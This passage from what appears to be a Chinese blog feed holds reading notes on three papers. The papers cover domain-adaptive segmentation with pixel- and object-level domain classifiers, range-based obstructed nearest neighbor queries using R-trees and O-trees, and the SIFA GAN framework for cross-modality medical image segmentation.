$A_{\mathcal{S}}^{pix}$：源域图像像素级标注 $A_\mathcal{S}^{obj}$：源域图像物体级标注 $\mathcal{T}$：目标域，即真实数据域 $I_{\mathcal{T}}$：源域图像 $A_\mathcal{T}^{obj}$：源域图像物体级标注 几乎所有的基于深度学习的语义分割是基于FCN的，但是基于FCN的方法聚焦在局部特征，而忽略了大尺度的结构特征。在训练时，源域图像参与整个模型的训练，而目标域图像只参与检测部分的训练。在测试阶段，测试图像只通过分割网络来预测每个像素的得分图。 在物体检测和语义分割模型（DS）中，将FCN-8和SSD-512结合成了一个模型，并且它们的前四个卷积层是共享的，被称作Base Net。SSD-512用作物体检测，FCN-8用作语义分割。 DS模型通过以下损失函数来进行训练：$$\begin{aligned}\mathcal{L}{D S}=&amp; \mathcal{L}{s e g}\left(I_{\mathcal{S}}, A_{\mathcal{S}}^{p i x}\right) \&amp;+\mathcal{L}{d e t}\left(I{\mathcal{S}}, A_{\mathcal{S}}^{o b j}\right)+L_{d e t}\left(I_{\mathcal{T}}, A_{\mathcal{T}}^{o b j}\right)\end{aligned}$$其中，$\mathcal{L}{seg}(I_\mathcal{S},A_\mathcal{S}^{pix})$是二维交叉熵损失，$\mathcal{L}{det}(I_\mathcal{S},A_\mathcal{S}^{obj})$ 和$\mathcal{L}_{det}(I_\mathcal{T},A_\mathcal{T}^{obj})$ 是MultiBox目标损失。 PDC包括1个卷积层和2个反卷积层，PDC模型的损失如下：$$\begin{aligned}\mathcal{L}{P D C}=&amp;-\sum{O_{S}^{s e g} \in \mathcal{S}} \sum_{h \in H} \sum_{w \in W} \log \left(p\left(O_{S}^{P D C}\right)\right) \&amp;-\sum_{O_{\mathcal{T}}^{s e g} \in \mathcal{T}} \sum_{h \in H} \sum_{w \in W} \log \left(1-p\left(O_{\mathcal{T}}^{P D C}\right)\right)\end{aligned}$$其中$O_\mathcal{S}^{PDC}$和$O_\mathcal{T}^{PDC}$是源域和目标域图像像素级的分割得分图，$p(\cdot)$是像素级的softmax操作。 PDC模型损失的逆为：$$\begin{aligned}\mathcal{L}{P D C{i n v}}=&amp;-\sum_{O_{S}^{s e g} \in \mathcal{S}} \sum_{h \in H} \sum_{w \in W} \log \left(1-p\left(O_{\mathcal{S}}^{P D C}\right)\right) \&amp;-\sum_{O_{\mathcal{T}}^{s e g} \in \mathcal{T}} \sum_{h \in H} \sum_{w \in W} \log \left(p\left(O_{\mathcal{T}}^{P D C}\right)\right)\end{aligned}$$然而单独优化以上两个公式容易产生震荡，所以域融合损失为：$$\hat{\mathcal{L}}{P D C{i n v}}=\frac{1}{2}\left(\mathcal{L}{P D C}+\mathcal{L}{P D C_{i n v}}\right)$$最终的目标函数为：$$\begin{array}{c}\min {\theta{P D C}} \mathcal{L}{P D C} \\min _{\theta{D S}} \quad \mathcal{L}{D S}+\hat{\mathcal{L}}{P D C_{i n v}}\end{array}$$其中$\theta_{DS}$和$\theta_PDC$分别为DS和PDC的参数，DS和PDC交替训练，在训练一者的时候另一者的参数保持不变。 为了从输入图像的特征图中获取精确的物体特征，通常选用ROI Pooling操作。ROI Pooling中的位置信息是通过ground truth来提供的。在ROI Pooling之后，具有相同大小的物体特征被输入到ODC中，在ODC中，每个标签都是采用one-hot编码的向量。 N维one-hot向量$Y_N(c)=[y_1,y_2,…,y_N]$定义为：$$y_{i}=\left{\begin{array}{ll}1, &amp; \text { if } i=c \0, &amp; \text { otherwise }\end{array}\right.$$其中c为类别，源域中类别为c的物体，会生成一个one-hot向量$A_\mathcal{S}^c=Y_{2N}(c)$作为其标签。同理，目标域的标签为$A_\mathcal{T}^c=Y_{2N}(N+c)$，ODC的损失为：$$\begin{aligned}\mathcal{L}{O D C}=&amp; C E L\left(p\left(O{\mathcal{S}}^{O D C}\right), A_{\mathcal{S}}^{c}\right) \&amp;+C E L\left(p\left(O_{\mathcal{T}}^{O D C}\right), A_{\mathcal{T}}^{c}\right)\end{aligned}$$其中$O_\mathcal{S}^{ODC}$和$O_\mathcal{T}^{ODC}$表示每个物品特征的得分向量，CEL函数是标准交叉熵损失。 同时ODC损失的逆被用来知道SSD-512学习域间不变性特征，源域和目标域标签的逆表示为$A_{\mathcal{S}{\text {inv}}}^{c}=Y{2 N}(N+c)$和$A_{\mathcal{T}{\text {inv}}}^{c}=Y{2 N}(c)$，ODC损失的逆为：$$\begin{aligned}\mathcal{L}{O D C{i n v}}=&amp; C E L\left(p\left(O_{S}^{O D C}\right), A_{\mathcal{S}{i n v}}^{c}\right) \&amp;+C E L\left(p\left(O{\mathcal{T}}^{O D C}\right), A_{\mathcal{T}{i n v}}^{c}\right)\end{aligned}$$为了避免震荡，使用域融合目标函数：$$\hat{\mathcal{L}}{O D C_{i n v}}=\frac{1}{2}\left(\mathcal{L}{O D C}+\mathcal{L}{O D C_{i n v}}\right)$$整个模型（DS,PDC,ODC）的训练损失函数如下：$$\begin{array}{c}\min {\theta{P D C}} \quad \mathcal{L}{P D C} \\min _{\theta{O D C}} \quad \mathcal{L}{O D C} \\min _{\theta{D S}} \quad \mathcal{L}{D S}+\hat{\mathcal{L}}{P D C_{i n v}}+\hat{\mathcal{L}}{O D C{i n v}}\end{array}$$在训练模型的一个部分时，其他部分的参数保持不变。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】基于范围的有障碍最近邻查询（RONN）]]></title>
    <url>%2F2020%2F05%2F25%2FRONN%2F</url>
    <content type="text"><![CDATA[本文是关于论文《Range-based Obstructed Nearest Neighbor Queries（RONN）》（基于范围的有障碍最近邻查询）的阅读笔记。没有完全读懂。 一、记号RONN：基于范围的有障碍最近邻（range-based obstructed nearest neighbor） CONN：连续有障碍最近邻（continuous obstructed nearest neighbor） CONNB：CONN-based算法（作为baseline） RONN-RF：通过R树过滤的RONN（RONN by R-tree Filtering） O-tree：O树，将有障碍空间划分为多个非有障碍空间，在RONN中快速检索高质量的候选对象 OOB：最优有障碍平衡（optimal obstacle balance），空间划分的方案 RONN-OA：通过O树加速的RONN（RONN by O-tree Acceleration） RNN：范围最近邻 二、背景RNN查询是检索某个空间区域的最近邻，是一种基础查询，可以归类为以下四个使用场景： 隐私保护：用户不愿意暴露自己确切的位置信息，空间匿位（Spatial cloaking）技术，模糊用户在空间区域的确切位置 连续查询：当用户正在移动时的连续查询时，在服务器上处理单个NN查询是低效的，提交一个RNN查询来预取这个区域的所有可能的近邻作为候选集是一个更好的选择 批处理：相近的最近邻查询可能是由不同用户发出的，将空间上邻近的最近邻查询分成一组，并将其批处理，并从返回的候选集中解析每个NN查询的结果。 位置不确定性：由于定位技术、网络延迟等带来的限制，用户的位置的不确定性仍是一个问题。可以给RNN查询设定一个空间区域（用户在该区域内）。 之前的RNN工作都是假设是一个平坦的，没有障碍的空间，并使用欧几里得距离和数据对象和查询范围之间的最短距离，来作为距离的度量标准。但在现实中，两个点之间可能有障碍，所以就要使用有障碍距离，即两个点之间没有任何障碍的最短路径。 三、文章概述1. 简短概述RONN是CONN的进阶版，为了解决RONN，首先提出了CONNB作为baseline，它将一个RONN查询划分为一个范围查询和四个CONN查询。为了克服CONNB查询次数太多的问题，又提出了RONN-RF算法，它和CONNB一样都是基于R树的。但是R树本身也有缺点，所以又提出了O树来代替R树，O树将有阻碍空间划分为无阻碍空间并进行检索。同时还提出了构建O树的算法和空间划分方案OOB（最优障碍平衡）。有了O树，又在其基础上提出了RONN-OA算法，它利用O树来加速RONN查询的处理。 2. 详细概述本文提出了CONNB作为baseline，它将RONN查询简化为了一个范围查询和四个CONN查询。（R树保存数据对象和障碍）本文是第一个试图解决RONN问题的文章。 为了解决CONNB的缺点，又提出了RONN-RF算法，它采用高效的过滤策略来促进查询的效率。然而，在处理RONN时，由于障碍在R树中的表示问题，存在两个困难： 对于RONN-RF和CONNB都需要多次遍历R树，前者需要遍历两次，后者需要遍历5次 R-树索引同一欧氏空间中的数据对象和障碍物，增加了计算量 为了解决以上两个问题，又提出了O-tree，它在无障碍子空间里组织数据对象和障碍物。他的主要思想是将障碍空间划分为无障碍子空间。R树最终被嵌入到O树中用来解决无障碍子空间。 为了建立平衡的O树，提出了树的平衡的概念——障碍平衡（obstacle balance）。因为O树的平衡主要受选择障碍物的顺序的影响。所以提出了一种空间划分方案——OOB（optimal obstacle balance）。此外，提出了RONN-OA的算法来加速RONN的查询过程。 文章最后在真实数据和合成数据上进行了实验，验证了RONN-OA和RONN-RF都比CONNB提升很多。 四、定义RONN查询：给定一个数据对象的集合 P 和障碍的集合 O，一个带有查询范围 R 的 RONN 查询，基于有障碍距离，检索 R 中所有点的最近邻，即$RONN(Q)={ONN(p)|p\in R}$。 如图一所示，圆点表示数据对象，红线段表示障碍物，矩形表示查询范围，蓝色点表示查询结果。p7不在结果集中，因为有障碍物o1，p3不在结果集中，因为p4比它更近。在处理RONN时的主要挑战是采用什么样的障碍距离作为度量标准。 无障碍路径（obstacle-free path）：$P(p,p’)=&lt;d_0,d_1,…,d_n&gt;$，其中$d_i$是空间中的点，$d_0=p,d_n=p’$。 有障碍距离（obstructed distance）：无障碍路径$P(p,p’)$的距离定义为$|P(p,p’)|=\Sigma_{i\in[0,n-1]}dist(d_i,d_{i+1})$，其中$dist(d_i,d_{i+1})$是两点间的欧几里得距离。点$p$和$p’$之间的有障碍距离表示为$||p,p’||$，它是最短的无障碍路径的距离。 有障碍最近邻（obstructed nearest neighbor）：查询点$p$是点$q$的ONN当且仅当$\forall p’\in P-p,||p,q||\leq||p’,q||$，即$p$到$q$的有障碍距离小于等于其他点到$q$的有障碍距离。 连续有障碍最近邻（continuous obstructed nearest neighbor）：查询线段$\bar{q}$的CONN记作$CONN(\bar{q})$，满足$\forall q\in\bar{q},ONN(q)\in CONN(\bar{q})$，即线段上所有点的ONN的集合。 CONN的分割点（split points for CONN）：我们用$\bar{ab}$来表示查询线段$\bar{q}$，其中$a$和$b$是线段的两个端点，$\bar{q}$由$\bar{q_1},\bar{q_2},…,\bar{q_t}$组成，其中$\bar{q_1}=\bar{as_1},\bar{q_2}=\bar{s_1s_2},…,\bar{q_{t-1}}=\bar{s_{t-1}b}$。那么称$s_1,s_2,…,s_{t-1}$是线段$\bar{q}$的分割点。 如图二所示，$\bar{ab}$是查询线段，CONN的输出是${&lt;p_1,\bar{as_1}&gt;,&lt;p_2,\bar{s_1s_2}&gt;,&lt;p_6,\bar{s_2,s_3}&gt;,&lt;p_3,\bar{s_3b}&gt;}$，其中$s_1,s_2,s_3$是分割点。（个人感觉$s_1,s_3$的位置可能不止一个） 五、CONNB算法给定一个具有查询范围R的RONN查询Q，任何在R内部的对象都是查询的一个RONN，所以可以先找到在R内部的所有RONN，然后再找在R外部的RONN，R外部的RONN是R的边界的ONN的集合。 引理1：对象p是R外部的一个RONN当且仅当p在R的外部，并且p至少是R的边界上一点的ONN。 根据引理1，一个RONN查询可以分为5个查询：四个CONN查询（R的每一边作为一个查询线段）和一个范围查询。在CONNB中，R树被作用索引数据对象和障碍物。 六、RONN-RF注意，在查询处理期间获得的一些中间RONN可能会取消位于远离查询范围R的某些RONN候选资格。所以，一个有效的过滤方法是使用距离浏览方法（distance browing approach），根据RONN到R的最小欧氏距离来获得RONN。所以又提出了RONN-RF算法，它建立在R树上，便于基于距离的浏览和过滤。 RONN集合到线段的最大有障碍距离（maximum obstructed distance of an RONN set to line segment）：给定一个中间RONN的集合P和线段$\bar{ab}$，称$||m,p_m||$是从P到$\bar{ab}$的最大有障碍距离，表示为$max_odis(P,\bar{ab})$，当且仅当线段$\bar{ab}$上存在一个点m使得，$\forall\text{ point i on }\bar{ab},\quad ||i,ONN_P(i)||\leq||m,ONN_P(p)||$，$ONN_P(i)$表示在集合P中i点的ONN。(小写的p是什么，文章中没有提到) 如图4所示，$p_1$和$p_2$分别是在线段$\bar{as}$和$\bar{sb}$上所有点的RONN，$max_odist(p_1,\bar{as})=||p_1,s||\leq||p_2,b||=max_odist(p_2,\bar{sb})$，即$max_odis(P,\bar{ab})$ 每个边的MOD（maximum obstructed distances）用来过滤掉不合格的对象。 RONN-RF首先通过范围查询来获取内部RONN，并用其来初始化四个MOD，然后遍历R树，按到查询范围R的最小欧几里德距离的升序访问数据对象，以确定它们是否是每个边的ONN。在遍历R树时，使用堆H来存储R树条目，包括MBB（minimum bounding boxes）、数据对象和障碍物。 初始化时，H只有根节点条目e，RONN-RF通过到R的最短距离对条目e进行弹出，检查从e到R的最小欧几里德距离是否大于所有当前MOD，如果大于，则e将被删除，并且一个新条目将被弹出。否则，如果e是MBB（即内部索引节点），则将其所有子项推送到H中进行进一步处理。另一方面，如果e是R-树的叶节点，则有两种情况： e是障碍物：它被插入到可视化图VG中，用于计算边上分裂点； e是一个数据对象：它通过在范围边界的边上寻找分割点（FindSP）来更新RONN结果和对应于每个边的MOD（稍后将进一步讨论）。 重复上述查询处理步骤（即从手上清除新条目的堆等），直到H变为空。 RONN-RF同时测试一个数据对象到所有边的情况，而不是对每个边依次处理，这样提升了速度。RONN-RF只需要遍历R-树一次而不是四次。让$r_i,i=1,2,3,4$是查询范围R的角点，$\bar{E_{ij}}$表示边$\bar{r_ir_j}$，给定中间RONN的结果集（$RS_{ij}$）以及已访问过的障碍物的可视化图VG，我们就能确定数据对象在测试p下是否是边$\bar{E_{ij}}$的RONN。如果是，那么我们就可以获得分割点的列表，它可以把$\bar{E_{ij}}$分割成和$RS_{ij}$中的RONN相关的线段。此外，$\bar{E_{ij}}$的MOD也会被更新。 给定一个查询范围R，RONN-RF首先发出一个范围查询来获得内部的RONN，即$p_4$，并用其初始化四个边的MOD。接着，通过遍历R树来得到外部的RONN。一开始，堆中只有$N_1,N_2$，按它们到R的欧几里得距离进行升序排序。从H弹出顶部的$N_1$，由于$N_1$是内部节点，需要比较它的子条目$N_5，N_6，N_7$到R的欧几里得距离和已有的MOD的关系，并将$N_6，N_7$插入回堆中，而$N_5$由于大于MOD而被过滤掉了。类似的将$N_2$弹出，其子条目$N_3，N_4$入堆；然后$N_3$出堆，$p_5，p_6$被插入到H中，$p_4$已经在RONN的结果集中了，所以不再插入；弹出$N_6$，把其子条目$o_1$插入到可视化图VG中；同理，弹出$N_4$，在VG中插入$o_2$；然后将$p_5$弹出，因为它是数据对象，并且是一个RONN，通过VG更新分割点和每条边的MOD；同理$p_6$包含在结果集中；最后将$N_7$弹出，将其子条目$p_7$插入到H中，因为$p_8$的距离大于某些MOD，所以不插入。然后弹出 $p_7$，但由于$o_1$的存在，不能更新当前RONN结果，此时H为空，RONN结果集包含$p_4,p_5,p_6$。 在以上样例中，每条边都保存一个MOD，一个RONN的候选对象被过滤掉当且仅当它到查询范围边界的欧几里得距离大于相应的MOD， 定理1：给定一个查询范围R和当前RONN结果集RS，一个R-树的条目e被过滤当且仅当对于R的每一个边$\bar{ab}$，满足$min_dist(e,\bar{ab})&gt;max_odis(RS,\bar{ab})$，其中前者是欧几里得距离。 相比于CONNB算法，RONN-RF算法有两个优点： RONN-RF寻找外部RONN时，只需要遍历R-树一次，而CONNB需要四次 RONN-RF通过启发式的方式来对搜索空间进行剪枝 以下是RONN-RF的算法流程： 七、O-树R-树在处理RONN查询时，由于存在障碍，它面临两个问题。一个是需要在RONN-RF和CONNB中对R树进行多次遍历。在执行内部RONN（范围查询）和外部RONN查询时，RONN-RF需要遍历R树两次，而CONNB需要对R树进行五次扫描。另一个问题是在线计算有障碍距离是非常耗时的。 文章的想法是沿着选定的障碍物线和一些垂直线（如其平分线）将空间划分为四个子空间。我们递归地将子空间划分成更多的子空间来建立索引结构。 首先考虑一个只有一个障碍的有障碍子空间。图6（a）示出了这种有障碍空间的示例。通过沿障碍物及其垂直平分线划分空间，我们得到了四个无障碍子空间。 图6（a）中，不仅需要访问$R_2$中的黑圈，而且还需要访问$R_1、R_3$和$R_4$中的所有其他灰色圈来找到RONN，这显然会挫败我们O-树的最终目标。O-tree只需要存储由$R_2$中的黑色圆圈和灰色圆圈$p_1、p_2、…、p_5$表示的数据对象。如图6（b）所示，在查询处理中只需要检查$R_{24}$和$R_3$相关联的数据对象 会出现两个关键问题：首先应选择哪一个障碍来划分空间？对于给定的障碍物，其垂直平分线是划分空间的最佳选择吗？我们认为平衡的O-树是可取的，因此提出了实现树平衡的空间划分策略。在O-树中，由于障碍物被用来确定空间划分的支点，我们的目标是保持障碍物平衡，其定义如下： 定义7。障碍物平衡（obstacle balance）：选择一个障碍物（障碍线及其垂直线）将空间划分为四个子空间。在每个划分步骤中，障碍物平衡由条件$|n_i−n_{i+1}|\leq1$（$n_i$表示每个子空间中障碍物的数目）来满足，即每个分支的高度差小于1。 事实上，基于障碍物及其垂直线的选择，我们并不总是能够构造出一棵平衡树。从图7可以看出，如果我们选择$o_4$（或$o_3$）来划分空间，没有合适的垂直线来满足严格的障碍物平衡。在选择其他障碍物进行空间划分时，仍然存在同样的情况。 由于我们不能总是建立一个严格平衡树，我们的目标是建立一个最优的近似平衡树。因此，为了构造最优平衡树，我们提出了一种新的空间划分方案，称为最优障碍平衡（OOB）方案。 择一个障碍物（即障碍线）及其垂直线之一，将空间划分为四个子空间。目标是最小化目标函数$\Sigma(|n_i-n_j|)^2,i&lt;j,i,j=1,2,3,4$，其中$n_i，n_j$表示进入两个不同子空间的障碍物的数量。 选择障碍物和垂直线的OOB方案：有n个障碍物，选择每个障碍物的花费是O(n)，选定障碍物后再确定垂直线，这里以其他障碍物的端点在选定障碍线上的投影点做垂线从而得到垂直线，共有2(n-1)中可能，所以总时间复杂度为O(n*2(n-1))。如图8所示，选择$l_1$和$h_1、l_2$和$h_2$的效果是等价的，即一定范围的垂直线总是等于通过端点投影的一条垂直线。 O树索引的结构如下。根节点表示整个有障碍空间，指向四个子节点。这些子节点中的每一个子节点表示有障碍空间中的一个区域。O-树的内部节点维护（$reg$，$obs$，$optr_1$，$optr_2$，$optr_3$，$optr_4$）的条目，而叶节点包含形式（reg，rptr）的条目，其中reg表示二维多边形区域，obs是划分空间的障碍，optr i和rptr分别表示指向O-树和R-树节点的指针。图9示出了空间划分和对应的O树，图中实箭头是rptr，线箭头是optr。 由于O-tree索引存在一定的数据冗余，因此有两个潜在的问题：（i）索引大小增加；（ii）查询处理中同一数据对象可能存在冗余遍历。 为了减小索引的大小，我们将所有数据对象存储在一个 objects 数组中，并将每个对象的数组索引 id 存储在O树索引中。当测试数据对象 p 的时候，先查看其副本 p’ 是否在结果集中。还构建了一个与图9中的 objects 数组相关的 isInResult 数组。isInResult 数组标记数据对象是否在结果集中。 在构造了O树之后，通过调用CLN算法，用相应的R树填充O树索引的叶节点 先将叶节点内所有点插入到R树中，然后计算节点区域的每个边的ONNs，并将它们插入R-树。 八、RONN-OA与RONN-RF类似，RONN-OA保持四个最大有障碍距离（MOD），以过滤不合格对象。RONN-OA首先发出一个范围查询以获取内部RONN，用于初始化四个MOD。值得注意的是，范围查询还返回与查询范围相交的O-tree的叶节点。接下来，在获得O-树的叶节点后，RONN-OA继续遍历相应的R-树来访问数据对象以找到外部RONN。在遍历R树期间，堆H用于存储R树条目。最初，H只包含与检索到的O树叶节点相关联的R树的根条目。RONN-OA的建堆和处理的过程与RONN-RF算法一致。 定理2：RONN-OA算法精确地检索给定查询范围内每个点的ONN，即该算法没有错误的未命中和错误的命中 九、实验文章在3个真实的数据集上做了实验： Greece：将河流看作线段障碍，将城市和村庄看作数据对象； Tiger Census Blocks：包括美国多个州的人口普查块（看作多边形障碍）； California Roads：把街道看作障碍，随机生成数据对象； 文章从两个方面进行性能评估： 评估RONN算法的效率：在各种参数下比较所提出的RONN算法的延迟（总结在表7中，粗体数字是默认设置）； 评估O树的效率：我们比较高度、叶节点数，比较O-树的索引大小和构造时间对空间划分策略的影响。 索引了三种不同类型的障碍： 线段障碍（即数据集中的多段线）； 矩形障碍（即数据集中的mbr）； 多边形障碍。 使用SpatialDataGenerator随机生成五组具有不同查询大小的RONN查询，其中每组查询由50个RONN查询组成。文章使用了关于障碍物数、数据对象数量、查询大小相关的平均延迟作为度量标准。 障碍物数量的影响：通过增加障碍物的数量来比较三种处理RONN查询的算法的平均运行时间。查找内部RONN所需的时间非常短。正如预期的那样，当障碍物数量增加时，性能会变差，这三种算法在以矩形表示障碍物时都花费了更长的时间。这是因为需要在相应的可见性图中插入更多的障碍顶点； 数据对象数量的影响：通过改变数据对象的数量来比较RONN算法的性能。而且，这三种算法的处理时间都随着数据对象数量的增加而增加； 查询大小的影响：通过改变查询大小来比较RONN算法； RONN-OA优于RONN-RF，因为O-tree索引可以过滤一些到查询范围的欧氏距离较小但到查询范围的阻塞距离较大的数据对象，而R-tree则不能过滤此类数据对象。 评估OOB方案的性能，并与以下两个基线方案进行比较： 随机：该方案在构造O-树时随机选择一个障碍物进行空间划分。 Obs-Ctr：利用选定障碍物的垂直平分线作为空间划分的垂直线。它选择得分最高的障碍物来划分当前空间。 为了比较这些空间划分方案，使用对应的O-树的高度和叶节点作为性能指标，因为它们反映了这些O-树的平衡程度，即叶节点的高度和数量越小，树的平衡越好。]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】SIFA——基于GAN的双向跨模态无监督域适应框架]]></title>
    <url>%2F2020%2F05%2F23%2FSIFA%2F</url>
    <content type="text"><![CDATA[本文是论文《Unsupervised Bidirectional Cross-Modality Adaptation via Deeply Synergistic Image and Feature Alignment for Medical Image Segmentation》的阅读笔记。 文章提出了一个名为 SIFA（Synergistic Image and Feature Alignment）的无监督域适应框架。SIFA 的代码见 github。SIFA 从图像和特征两个角度引入了对齐的协同融合。 一、相关工作域适应就是将从源域学习到的知识迁移到目标域中，在此之前 CycleGAN 在域适应方面取得了很好的效果。 SIFA 的一个关键特点是图像变换和分割任务的共享编码器。通过参数共享，本框架中的图像对齐和特征对齐能够协同工作，减少端到端训练过程中的域偏移（domain shift）。同时，另一个研究方向是特征对齐，目的是在对抗性学习的情况下提取深度神经网络的域不变特征。 二、记号 $s$：源域 $t$：目标域 $G_t$：从源域到目标域的生成器，生成 $x^{s\rightarrow t}$ $D_t$：从源域到目标域的判别器，判别图像是生成的还是真正来自目标域的 $E$：特征编码器 $U$：解码器 $C$：像素级分类器 $G_s=E\circ U$：特征编码器+解码器相当于一个源域生成器，生成 $x^{t\rightarrow s}$ $E\circ C$：特征编码器+像素级分类器相当于一个分割网络，产生目标域图像和生成的目标域图像的分割标签 $D_s$：判别生成的源域图像来自生成的目标域图像 $x^{s\rightarrow t}$ 还是来自真正的目标域图像 $x_t$ 的判别器 $D_p$：对分割网络生成的分割标签进行判别的判别器 $\mathcal{L}^t_{adv}(G_t,D_t)$：目标域 GAN（$G_t,D_t$）的目标函数 $\mathcal{L}_{cyc}(G_t,E,U)$：源域-目标域-源域或目标域-源域-目标域的循环一致性损失 $\mathcal{L}_{seg}(E,C)$：分割网络的混合损失 $\mathcal{L}{a d v}^{p}(E, C, D{p})$：判别器 $D_p$ 的对抗损失 $\mathcal{L}{\text {adv }}^{s}(E, D{s})$：判别器 $D_s$ 的对抗损失 $\mathcal{L}{\text {adv }}^{\tilde{s}}(E, D{s})$：判别器 $D_s$ 辅助任务的对抗损失 三、方法1. 用于图像对齐的外观转变由于域偏移，跨域之间的图片通常看起来不同，而图像对齐的目的就是减少源域图像和目标域图像之间的这种差异。即给定一个有标签的来自源域的数据集 ${x_i^s,y_i^s}{i=1}^N$，以及一个无标签的来自目标域的数据集 ${x_i^t}{j=1}^M$，使得源域图像 $x_i^s$ 尽可能的看起来像 目标域图像 $x_i^t$。转换后的图像不仅要看起来像来自目标域，而且还应该保留源域的结构语义内容。 上图是网络的整体结构示意图，可结合以下描述来加以理解。 （1）外观转变使用一个生成器 $G_t$ 将源域图像转换成与目标域相似的图像，即 $G_t(x^s)=x^{s\rightarrow t}$，并使用一个判别器 $D_t$ 来判断生成的图像是真正来自目标域还是生成的。这个 GAN 的目标函数为：$$\begin{aligned}\mathcal{L}{\text {adv}}^{t}\left(G{t}, D_{t}\right)=&amp; \mathbb{E}{x^{t} \sim X^{t}}\left[\log D{t}\left(x^{t}\right)\right]+\&amp; \mathbb{E}{x^{s} \sim X^{s}}\left[\log \left(1-D{t}\left(G_{t}\left(x^{s}\right)\right)\right)\right]\end{aligned}$$为了让转换得到的图像 $x^{s\rightarrow t}$ 保留源域的特征，通常使用一个反向的生成器来促进图像的循环一致性。图中的 E 是特征编码器，U 是解码器，E 和 U 加起来就相当于一个生成器 $G_s$，即 $G_s=E\circ U$ ，它可以将转换得到的目标域图像 $x^{s\rightarrow t}$ 再转换回源域。并通过源域的判别器 $D_s$ 进行判别，其对抗损失为 $\mathcal{L}{adv}^s$，和目标域上的 GAN 的训练方式一致。通过源域-目标域-源域（$x^{s \rightarrow t \rightarrow s}=U\left(E\left(G{t}\left(x^{s}\right)\right)\right)$）或目标域-源域-目标域（$x^{t \rightarrow s \rightarrow t}=G_{t}\left(U\left(E\left(x^{t}\right)\right)\right)$）的转换就得到了图像的循环一致性损失，即：$$\begin{aligned}\mathcal{L}{\mathrm{cyc}}\left(G{t}, E, U\right)=&amp; \mathbb{E}{x^{s} \sim X^{s}}\left|U\left(E\left(G{t}\left(x^{s}\right)\right)\right)-x^{s}\right|{1}+\&amp; \mathbb{E}{x^{t} \sim X^{t}}\left|G_{t}\left(U\left(E\left(x^{t}\right)\right)\right)-x^{t}\right|_{1}\end{aligned}$$ （4）目标域的分割网络 图中的 C 是一个像素级的分类器，E 和 C 加起来 $E\circ C$ 就相当于一个目标域的分割网络，它的输入包括 $x^{s\rightarrow t},y^s,x^t$，输出是 $x^{s\rightarrow t},x^t$ 的分割标签，分割网络通过最小化一个混合损失（分割损失）来优化：$$\mathcal{L}_{s e g}(E, C)=H\left(y^{s}, C\left(E\left(x^{s \rightarrow t}\right)\right)+\operatorname{Dice}\left(y^{s}, C\left(E\left(x^{s \rightarrow t}\right)\right)\right)\right.$$其中第一项是交叉熵，第二项是 Dice 损失。 2. 特征对齐的对抗学习为解决跨域的域偏移问题，文章提出了另外的判别器来从特征对齐的角度来减少生成的目标图像 $x^{s\rightarrow t}$ 和真正的目标图像 $x^t$ 的 domain gap。为了对齐以上两种图像的特征，通常的方法是在特征空间直接使用对抗学习，但是特征空间一般是高维的，很难直接对齐。所以文章使用的方法是在两个低维的空间内使用对抗学习，一个是语义预测空间，另一个是生成图像空间。 （1）在语义预测空间的特征对齐使用判别器 $D_p$ 来对分割网络生成的分割标签进行判别，如果两者的特征没有对齐的话，就通过反向传播对特征提取器 E 进行优化，从而减小生成的目标域图像 $x^{s\rightarrow t}$ 和真正的目标域图像 $x^t$ 的特征分布之间的差异。该对抗损失为：$$\begin{aligned}\mathcal{L}{a d v}^{p}\left(E, C, D{p}\right)=&amp; \mathbb{E}{x^{s \rightarrow t} \sim X^{s \rightarrow t}\left[\log D{p}\left(C\left(E\left(x^{s \rightarrow t}\right)\right)\right)\right]+} \&amp; \mathbb{E}{x^{t} \sim X^{t}\left[\log \left(1-D{p}\left(C\left(E\left(x^{t}\right)\right)\right)\right)\right]}\end{aligned}$$ （2）语义预测空间的深度监督对抗学习低级特征可能和高级特征的对齐情况并不一样，所以使用额外的和编码器低层的输出相关的像素级分类器来产生额外的辅助预测，然后通过一个判别器来对这些额外预测进行判别。这增强了低级特征的对齐，如此一来，$\mathcal{L}{seg}$ 和 $\mathcal{L}{adv}$ 的表达式就需要进行调整了，它们分别被拓展为 $\mathcal{L}{seg}^i(E,C_i)$ 和 $\mathcal{L}{adv}^{P_i}(E,C_i,D_{p_i})$，其中 $i={1,2}$，$C_1,C_2$ 表示连接到编码器不同层的两个分类器，$D_{p_1},D_{p_2}$ 表示对两个分类器的输出进行判别的判别器。 （4）生成图像空间的特征对齐对于生成器 $E\circ U$，为判别器 $D_s$ 增加一个辅助任务——判别生成的源域图像来自生成的目标域图像 $x^{s\rightarrow t}$ 还是来自真正的目标域图像 $x^t$。该辅助任务的对抗损失为：$$\begin{aligned}\mathcal{L}{\text {adv }}^{\tilde{s}}\left(E, D{s}\right)=&amp; \mathbb{E}{x^{s \rightarrow} t \sim X^{s \rightarrow t}}\left[\log D{s}\left(U\left(E\left(x^{s \rightarrow t}\right)\right)\right)\right]+\&amp; \mathbb{E}{x^{t} \sim X^{t}}\left[\log \left(1-D{s}\left(U\left(E\left(x^{t}\right)\right)\right)\right)\right]\end{aligned}$$ 3. 用于协同学习的共享编码器在协同学习框架的一个关键是在图像和特征对齐之间共享编码器 E，编码器 E 会通过损失 $\mathcal{L}{adv}^s$ 和 $\mathcal{L}{cyc}$，以及判别器 $D_{p_i},D_s$ 的反向传播来进行优化。 在训练时各个模块的训练顺序为：$G_t\rightarrow D_t \rightarrow E \rightarrow C_i \rightarrow U \rightarrow D_s \rightarrow D_{p_i}$。整个网络的目标函数为：$$\begin{aligned}\mathcal{L}=&amp; \mathcal{L}{a d v}^{t}\left(G{t}, D_{t}\right)+\lambda_{a d v}^{s} \mathcal{L}{a d v}^{s}\left(E, U, D{s}\right)+\&amp; \lambda_{\mathrm{gs}} \mathcal{L}{\mathrm{csc}}\left(G{t}, E, U\right)+\lambda_{\operatorname{seg}}^{1} \mathcal{L}{\operatorname{seg}}^{1}\left(E, C{1}\right)+\&amp; \lambda_{\operatorname{seg}}^{2} \mathcal{L}{\operatorname{seg}}^{2}\left(E, C{2}\right)+\lambda_{a d v}^{p_{1}} \mathcal{L}{a d v}^{p{1}}\left(E, C, D_{p_{1}}\right)+\&amp; \lambda_{\text {adv}}^{p_{2}} \mathcal{L}{a d v}^{p{2}}\left(E, C, D_{p_{2}}\right)+\lambda_{a d v}^{\tilde{s}} \mathcal{L}{a b}^{\tilde{s}}\left(E, D{s}\right)\end{aligned}$$其中 $\left{\lambda_{a d v}^{s}, \lambda_{c y 